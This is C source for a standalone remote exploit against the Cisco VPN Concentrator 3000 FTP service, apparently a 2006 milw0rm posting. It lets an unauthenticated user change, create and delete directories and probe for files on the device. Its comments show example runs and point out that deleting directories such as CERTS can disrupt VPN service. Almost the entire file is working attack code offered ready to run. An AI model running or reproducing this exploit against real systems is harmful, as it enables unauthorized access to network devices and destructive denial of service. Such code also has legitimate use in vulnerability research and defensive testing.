/* Cisco VPN Concentrator 3000 FTP remote exploit
 * ==============================================
 * A vulnerability exists in the Cisco VPN Concentrator 3000,
 * an unauthenticated user may access the file system through
 * manipulation of FTP service commands. An unauthenticated 
 * user can use the following commands;
 * 
 * CWD  - Change the current working directory
 * MKD  - Make a directory within the current working directory
 * CDUP - Change directory up one tree.
 * RNFR - Rename From (This can be used to identify files and directories)
 * SIZE - This can be used to identify files and directories
 * RMD  - This can be used to delete a directory
 *
 * The FTP service remembers the current working directory so directory
 * changes can affect exploitation. By removing potentially sensitive
 * directories such as "CERTS" it may be possible to disrupt service
 * to a VPN.
 * 
 * Confirmed Vulnerable
 * + Cisco Systems Inc./VPN 3000 concentrator Version 4.1.5 RelJun 18 2004
 * 
 * Example.
 * localhost exploits # ./prdelka-vs-CISCO-vpnftp -s 10.1.2.10 -c / 
 * [ Cisco VPN Concentrator 3000 FTP service exploit
 * [ Connected to 10.1.2.10 (21/tcp)
 * [ Changing directory to /
 * [ Success! changed directory to /
 * localhost exploits # ./prdelka-vs-CISCO-vpnftp -s 10.1.2.10 -t config
 * [ Cisco VPN Concentrator 3000 FTP service exploit
 * [ Connected to 10.1.2.10 (21/tcp)
 * [ Testing for the existance of config
 * [ Success! file config does exist!
 * 
 * 
 * - prdelka
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>

int main (int argc, char *argv[]){
	int ihost=0,index=0,imkdir=0,ichdir=0,idelete=0,itest=0,ipass=0,port=21;
	int c, sd, rc, size;
	char *host, *directory, *file, *buffer, *rbuffer;
	struct sockaddr_in servAddr;
	struct hostent *h;
        static struct option options[]={
                {"server", 1, 0, 's'},
                {"port", 1, 0, 'p'},
                {"rmdir", 1, 0, 'r'},
                {"mkdir", 1, 0, 'm'},
                {"chdir", 1, 0, 'c'},
		{"test", 1, 0, 't'},
                {"help", 0, 0,'h'}
        };
	printf("[ Cisco VPN Concentrator 3000 FTP service exploit\n");
        while(c != -1){
                c = getopt_long(argc,argv,"s:p:r:m:c:t:h",options,&index);
                switch(c){
                        case 's':
                                if(ihost==0){
	                                h = gethostbyname(optarg);
        	                        if(h==NULL){
                	                        printf("[ Error unknown host '%s'\n",optarg);
                        	                exit(1);
                                	}
	                                host = malloc(strlen(optarg) + 1);
        	                        sprintf(host,"%s",optarg);
                	                ihost = 1;
                                }                               
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'r':
				if(idelete==0){
					if(ipass!=1){
						ipass = 1;
						idelete = 1;
						directory = optarg;
					}
					else{
						printf("[ Error: cannot delete directory as another option already selected\n");
						exit(1);
					}
				}
				break;
			case 'c':
				if(ichdir==0){
					if(ipass!=1){
						ipass = 1;
						ichdir = 1;
						directory = optarg;
					}
					else{
						printf("[ Error: cannot change dir as another option already selected\n");
						exit(2);
					}
				}
				break;
			case 't':
				if(itest==0){
					if(ipass!=1){
						ipass = 1;
						itest = 1;
						file = optarg;
					}
					else{
						printf("[ Error: cannot test for existance as another option already selected\n");
						exit(3);
					}					
				}
				break;
			case 'm':
				if(imkdir==0){
					if(ipass!=1){
						ipass = 1;
						imkdir = 1;
						directory = optarg;
					}
					else{
						printf("[ Error: cannot make directory as another option already selected\n");
						exit(4);
					}
					
				}
				break;
			case 'h':
				printf("[ Usage instructions.\n[\n");
				printf("[ %s <required> (optional)\n[\n",argv[0]);
				printf("[\t--server|-s <ip/hostname>\n[\t--port|-p (port) [default 21]\n[\t--rmdir|-r (directory)\n[\t--mkdir|-m (directory)\n");
				printf("[\t--chdir|-c (directory)\n[\t--test|-t (filename/directory)\n[\n");
				exit(0);
				break;
			default:
				break;
		}
	}
        if(ihost  != 1 || ipass != 1){
        	printf("[ Error insufficient arguements, try running '%s --help'\n",argv[0]);
	        exit(1);
        }
        servAddr.sin_family = h->h_addrtype;
        memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
        servAddr.sin_port = htons(port);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd<0){
                printf("[ Cannot open socket\n");
                exit(1);
        }
        rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
        if(rc<0){
                printf("[ Cannot connect\n");
                exit(1);
        }
        printf("[ Connected to %s (%d/tcp)\n",host,port);
	rbuffer = malloc(1024);
	if(ichdir==1){
		printf("[ Changing directory to %s\n",directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,"CWD %s\r\n",directory);
		rc = send(sd, buffer, strlen(buffer),0);
                while((rc = recv(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(strstr(rbuffer,"250 Changed to .") != NULL){
                                printf("[ Success! changed directory to %s\n",directory);
                                break;
                        }
                        if(strstr(rbuffer,"530 Can't change directory to") != NULL){
                                printf("[ Error! cannot set current directory to %s\n",directory);
                                exit(-1);
                        }
                }
	}
	if(imkdir==1){
		printf("[ Making directory %s\n",directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,"MKD %s\r\n",directory);
		rc = send(sd, buffer, strlen(buffer),0);
		while((rc = recv(sd, rbuffer,1023,0)) != -1){
			rbuffer[rc]=0;
			if(strstr(rbuffer,"257 MKD command successful.") != NULL){
				printf("[ Success! directory %s created\n",directory);
				break;
			}
		}
	}
	if(idelete==1){
		printf("[ Deleting directory %s\n",directory);
		size = 2048 + strlen(directory);
		buffer = malloc(size);
		sprintf(buffer,"RMD %s\r\n",directory);
		rc = send(sd, buffer, strlen(buffer),0);
                while((rc = recv(sd, rbuffer,1023,0)) != -1){
                        rbuffer[rc]=0;
                        if(strstr(rbuffer,"250 RMD command successful.") != NULL){
                                printf("[ Success! directory %s deleted\n",directory);
                                break;
                        }
                }
	}
	if(itest==1){
		printf("[ Testing for the existance of %s\n",file);
		size = 2048 + strlen(file);
		buffer = malloc(size);
		sprintf(buffer,"RNFR %s\r\n",file);
		rc = send(sd, buffer,strlen(buffer),0);		
                while((rc = recv(sd, rbuffer,1023,0)) != -1){			
                	rbuffer[rc]=0;		
                        if(strstr(rbuffer,"350 RNFR accepted - file exists, ready for destination.") != NULL){
                                printf("[ Success! %s does exist!\n",file);
                                break;
                        }
                        if(strstr(rbuffer,"550 File does not exist!") != NULL){
                                printf("[ Success! %s does not exist\n",file);
                                break;
                        }
                }
	}
	exit(0);
}

// milw0rm.com [2006-10-24]
